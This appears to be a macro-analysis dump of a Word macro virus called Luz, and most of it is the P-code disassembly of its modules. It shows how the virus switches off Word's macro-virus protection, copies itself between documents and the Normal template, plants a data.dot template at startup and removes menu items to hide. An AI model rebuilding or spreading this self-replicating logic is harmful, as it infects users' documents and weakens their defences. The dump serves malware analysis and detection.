 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
 ' AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Luz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6771 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0002 " 2"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x0022 "This is very important information"
' Line #5:
' 	QuoteRem 0x0000 0x0023 "please, do not delete or modify !!!"
' Line #6:
' Line #7:
' 	Dim 
' 	VarDefn x
' 	VarDefn Contor (As Integer)
' Line #8:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocInf
' 	VarDefn NorInf (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn AD
' 	VarDefn NT (As Object)
' Line #10:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn OurCode2
' 	VarDefn LogData
' 	VarDefn LogFile
' 	VarDefn Temp (As String)
' Line #11:
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #14:
' 	LitStr 0x0004 "Am0r"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocInf 
' Line #15:
' 	LitStr 0x0004 "Am0r"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NorInf 
' Line #16:
' 	LitDI2 0x0000 
' 	St Contor 
' Line #17:
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #20:
' Line #21:
' 	LineCont 0x0008 0B 00 00 00 12 00 01 00
' 	Ld DocInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NorInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #22:
' 	ArgsCall Read 0x0000 
' Line #23:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #24:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Your name is "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0010 "Unrequested Info"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #25:
' Line #26:
' 	Ld DocInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #28:
' 	LitDI2 0x0002 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St OurCode 
' Line #29:
' 	LitStr 0x0003 "' 1"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld OurCode 
' 	Concat 
' 	St OurCode 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #31:
' 	Ld OurCode 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #32:
' 	LitStr 0x000B "Luz Clarita"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #33:
' 	LitStr 0x0012 "Am0r A La Mexicana"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #36:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	LineCont 0x0008 05 00 03 00 13 00 04 00
' 	Ld NorInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St OurCode 
' Line #42:
' 	Ld OurCode 
' 	St OurCode2 
' Line #43:
' 	Ld OurCode2 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Contor 
' Line #44:
' 	LitDI2 0x0002 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St OurCode2 
' Line #45:
' 	LitStr 0x0001 "'"
' 	Ld Contor 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Trim 0x0001 
' 	St Temp 
' Line #46:
' 	Ld Temp 
' 	Ld OurCode2 
' 	Add 
' 	St OurCode2 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #48:
' 	Ld OurCode 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld OurCode2 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #51:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #52:
' 	LitStr 0x0014 "c:\MS Office Luz.frm"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #53:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld Contor 
' 	LitDI2 0x0042 
' 	Ge 
' 	IfBlock 
' Line #57:
' 	LineCont 0x000C 03 00 01 00 05 00 01 00 0C 00 01 00
' 	LitStr 0x0007 "Hello! "
' 	LitStr 0x003B "My name is Luz Clarita and I'm a very friendly macro-virus."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0038 "You should share your documents with your friends... :-)"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0019 "I salut you from Romania!"
' 	Concat 
' 	Ld vbExclamation 
' 	LitStr 0x0006 "SALUT!"
' 	ArgsCall MsgBox 0x0003 
' Line #58:
' 	Ld Joculetz 
' 	ArgsMemCall Show 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Private Sub Document_New())
' Line #63:
' Line #64:
' 	EndSub 
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Macros/VBA/Joculetz - 2634 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #7:
' 	Ld Joculetz 
' 	ArgsMemCall Hide 0x0000 
' Line #8:
' 	LitStr 0x0003 "Aha"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #12:
' 	LitDI2 0x0001 
' 	St a 
' Line #13:
' 	LitDI2 0x0005 
' 	St B 
' Line #14:
' 	Do 
' Line #15:
' 	Ld Label1 
' 	MemLd Font 
' 	MemLd Size 
' 	Ld a 
' 	Add 
' 	Ld Label1 
' 	MemLd Font 
' 	MemSt Size 
' Line #16:
' 	Ld CommandButton1 
' 	MemLd LBound 
' 	Ld B 
' 	Add 
' 	Ld CommandButton1 
' 	MemSt LBound 
' Line #17:
' 	Ld Label1 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI2 0x0023 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld a 
' 	UMi 
' 	St a 
' 	EndIf 
' Line #18:
' 	Ld CommandButton1 
' 	MemLd LBound 
' 	Ld Joculetz 
' 	MemLd With 
' 	LitDI2 0x0046 
' 	Sub 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	UMi 
' 	St B 
' 	EndIf 
' Line #19:
' 	Ld Label1 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI2 0x0008 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld a 
' 	UMi 
' 	St a 
' 	EndIf 
' Line #20:
' 	Ld CommandButton1 
' 	MemLd LBound 
' 	LitDI2 0x0014 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	UMi 
' 	St B 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #22:
' 	Ld i 
' 	ArgsLd Str 0x0001 
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	LitStr 0x0004 "Okay"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #25:
' 	Ld DoEvents 
' 	St dummy 
' Line #26:
' 	Ld CommandButton1 
' 	MemLd Caption 
' 	LitStr 0x0003 "Aha"
' 	Eq 
' 	LoopUntil 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #30:
' Line #31:
' 	EndSub 
' Macros/VBA/groovie - 30728 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn I01 (As String)
' Line #1:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #2:
' 	Dim (Public) 
' 	VarDefn I02 (As Boolean)
' Line #3:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #4:
' 	Dim (Public) 
' 	VarDefn I03 (As Boolean)
' Line #5:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #6:
' 	Dim (Public) 
' 	VarDefn I04 (As Boolean)
' Line #7:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #8:
' 	Dim (Public) 
' 	VarDefn I05 (As Boolean)
' Line #9:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #10:
' 	Dim (Public) 
' 	VarDefn I06 (As String)
' Line #11:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #12:
' 	Dim (Public) 
' 	VarDefn I07 (As Boolean)
' Line #13:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #14:
' 	Dim (Public) 
' 	VarDefn I08 (As Boolean)
' Line #15:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #16:
' 	FuncDefn (Function I09())
' Line #17:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #20:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #22:
' 	LitStr 0x0006 "normal"
' 	St I01 
' Line #23:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #24:
' 	GoTo checkout 
' Line #25:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #28:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "document"
' 	St I01 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #30:
' 	Ld MacroContainer 
' 	LitStr 0x0008 "data.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "orbit"
' 	St I01 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #32:
' 	Label checkout 
' Line #33:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #34:
' 	EndFunc 
' Line #35:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #36:
' 	FuncDefn (Function I10())
' Line #37:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0008 "data.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St I02 
' 	EndIf 
' Line #41:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #43:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #44:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "groovie"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St I04 
' 	EndIf 
' Line #45:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #49:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #50:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "groovie"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St I03 
' 	EndIf 
' Line #51:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #54:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ld vbReadOnly 
' 	Add 
' 	Eq 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St I05 
' 	EndIf 
' Line #55:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #56:
' 	EndFunc 
' Line #57:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #58:
' 	FuncDefn (Function I11())
' Line #59:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #62:
' 	ArgsCall (Call) I09 0x0000 
' Line #63:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #64:
' 	ArgsCall (Call) I10 0x0000 
' Line #65:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #66:
' 	Ld I01 
' 	LitStr 0x0008 "document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) I12 0x0000 
' 	EndIf 
' Line #67:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #68:
' 	Ld I01 
' 	LitStr 0x0006 "normal"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) I13 0x0000 
' 	EndIf 
' Line #69:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #70:
' 	Ld I01 
' 	LitStr 0x0005 "orbit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) I14 0x0000 
' 	EndIf 
' Line #71:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #72:
' 	Ld I05 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #73:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #74:
' 	Ld I05 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #75:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #76:
' 	EndFunc 
' Line #77:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #78:
' 	FuncDefn (Function I12())
' Line #79:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #82:
' 	LitStr 0x000E "c:\groovie.sys"
' 	LitStr 0x0007 "groovie"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #83:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #84:
' 	Ld I03 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld I05 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #85:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #86:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #87:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #88:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\groovie.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #89:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #90:
' 	EndWith 
' Line #91:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #92:
' 	EndWith 
' Line #93:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #96:
' 	Ld I02 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #97:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #98:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #99:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #100:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0009 "\data.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0007 "groovie"
' 	ParamNamed New 
' 	LitStr 0x0005 "orbit"
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #101:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #103:
' 	QuoteRem 0x0001 0x004E " AM07.03.01 09:35:3632Andreas Marx32HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW"
' Line #104:
' 	Ld I08 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I06 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' 	EndIf 
' Line #105:
